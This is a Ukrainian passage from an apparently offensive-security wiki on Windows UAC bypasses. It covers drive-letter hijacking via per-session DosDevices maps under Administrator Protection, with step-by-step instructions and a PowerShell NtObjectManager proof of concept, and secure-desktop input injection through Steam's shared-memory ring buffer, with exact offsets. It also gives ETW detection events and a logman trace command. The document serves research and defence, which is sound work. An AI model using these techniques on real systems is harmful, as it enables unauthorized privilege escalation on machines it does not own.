У деяких ланцюжках атак, описаних після 2024 року, вже немає типового перехоплення через реєстр `HKCU\Software\Classes`. Наприклад, отруєння кешу контексту активації може поєднувати **перепризначення диска** та **перенаправлення DLL**, щоб перейти від середнього до високого рівня цілісності через довірені елементи інтерфейсу або бінарні файли з автоматичним підвищенням привілеїв, як-от `ctfmon.exe`, а згодом — цілі на кшталт `fodhelper.exe`. Замість того щоб дублювати тут великий PoC, перегляньте компактні приклади payload у:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Перехоплення літери диска через карту DOS-пристроїв для сеансу входу (Administrator Protection, попередня версія)

> [!NOTE]
> Станом на серпень 2026 року Microsoft і досі описує Administrator Protection як **попередню версію для учасників програми Insider**: розгортання у жовтні 2025 року було скасовано, а запуск перенесено на пізніший термін. Перш ніж тестувати ці ланцюжки, переконайтеся, що **режим схвалення адміністратором із захистом адміністратора** справді ввімкнено, а пристрій перезавантажено; сам рядок версії 25H2 не доводить, що функція активна.<sup>[[10]](#references)</sup>

Щоб дізнатися про всю поверхню атак `RAiLaunchAdminProcess` / UIAccess у попередніх збірках Windows 11 25H2, перегляньте окрему сторінку:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

У Windows 11 25H2 функція «Administrator Protection» використовує токени тіньового адміністратора з картами `\Sessions\0\DosDevices/<LUID>` для кожного сеансу. Каталог створюється із затримкою функцією `SeGetTokenDeviceMap` під час першої спроби розв’язати `\??`. Якщо зловмисник уособлює токен тіньового адміністратора лише з рівнем **SecurityIdentification**, каталог створюється під власником-зловмисником (успадковує `CREATOR OWNER`), що дає змогу створювати посилання на літери дисків, які мають пріоритет над `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Кроки:**

1. Із сеансу з низькими привілеями викличте `RAiProcessRunOnce`, щоб запустити `runonce.exe` тіньового адміністратора без запиту.
2. Дублюйте його первинний токен, створивши токен рівня **ідентифікації**, та уособлюйте його під час відкриття `\??`, щоб примусово створити `\Sessions\0\DosDevices/<LUID>` із власником-зловмисником.
3. Створіть там symlink `C:`, що вказує на сховище під контролем зловмисника; подальший доступ до файлової системи в цьому сеансі перенаправлятиме `C:` на шлях зловмисника, що дасть змогу виконати DLL/file hijack без запиту.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```

На хостах із попередніми версіями Administrator Protection фіксує схвалення та помилки як події ETW **15031** і **15032** у провайдері `Microsoft-Windows-LUA`. Події містять SID запитувача, шлях до програми, результат, керований обліковий запис адміністратора та метод автентифікації, тож повторні спроби експлуатації або невдалі спроби керування інтерфейсом не залишаються без телеметрії.<sup>[[10]](#references)</sup>

```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```



### Введення через secure desktop, переслане через доступний для запису кільцевий буфер спільної пам’яті

Помічник secure desktop може скомпрометувати запит UAC, якщо користувач із середнім рівнем цілісності може записувати в його IPC для введення. У описаній схемі Steam `IClientSecureDesktop::BStartStreaming` запускає `secure_desktop_capture.exe` від імені SYSTEM на `winsta0\winlogon`. Він надає користувачу доступ `GENERIC_ALL` до `Global\SecureDesktopInput_mem-IPCWrapper`; помічник зчитує записи з кільцевого буфера й викликає `SendInput` на secure desktop. Це відрізняється від UIAccess або зміни `PromptOnSecureDesktop`: введення пересилає процес, який уже запущений там. Див. [запуск IPC служби](../windows-local-privilege-escalation/abusing-auto-updaters-and-ipc.md#shared-memory-bootstrap-into-privileged-service-ipc), щоб дізнатися, як клієнт викликає цей обробник. <sup>[[15]](#references)[[16]](#references)</sup>

Кільцевий буфер містить 128 слотів по 173 байти. Лічильники запису й читання розташовані за адресами `0x414` і `0x418`, а слот `N` — за адресою `0x41c + 173*N`. Установіть перший байт слота в `0` для відкритого тексту, скопіюйте 40-байтову структуру Windows `INPUT` одразу за ним, а потім збільште лічильник запису. Для адміністратора із середнім рівнем цілісності, якому показано запит на підтвердження, натискання й відпускання клавіші `Y` може активувати кнопку підтвердження UAC після запуску виконуваного файла, який запитує підвищення прав; воно не дає відповіді на запит облікових даних для стандартного користувача. **Перевірка згоди все ще важлива**: помічник пересилає введення лише після того, як користувач схвалив запит `InputEnabled` на поточний 90-денний період авторизації. Сам факт наявності доступного для читання й запису відображення не доводить, що введення надходить до запиту; порівняйте лічильник читання до й після контрольованої перевірки. <sup>[[15]](#references)[[16]](#references)</sup>

## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Як працює User Account Control](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Збірка методів обходу UAC](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – Сканер сумісності та засіб запуску для обходу UAC](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI використовує AI для створення бекдорів PowerShell](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos: експлуатація 0-day проти урядових цілей у Південно-Східній Азії](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Обхід Windows Administrator Protection](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – Обхід UAC за допомогою завдання SilentCleanup](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – Обходи UnifiedConsent, TabTip і Narrator Always Notify](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – Захист адміністратора](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
- [11] [Google Project Zero – Виклик локальних серверів Windows RPC із .NET](https://projectzero.google/2019/12/calling-local-windows-rpc-servers-from.html)
- [12] [Kaspersky Securelist – HoneyMyte удосконалює CoolClient за допомогою підписаного руткіта ядра Windows](https://securelist.com/honeymyte-coolclient-driver-rootkit/121028)
- [13] [Group-IB – KGB RAT: повністю невиявний троян для Windows, створений для шпигунства, крадіжок і залякування](https://www.group-ib.com/blog/kgb-rat-windows-fud-trojan/)
- [14] [LOLBAS – ComputerDefaults.exe](https://lolbas-project.github.io/lolbas/Binaries/ComputerDefaults/)
- [15] [Atredis – Перекручуючи Valve](https://atredis.com/blog/2026/10/28/turning-the-valve)
- [16] [Atredis – PoC для Turning the Valve](https://github.com/atredispartners/proof-of-concept/tree/main/turning-the-valve/code)
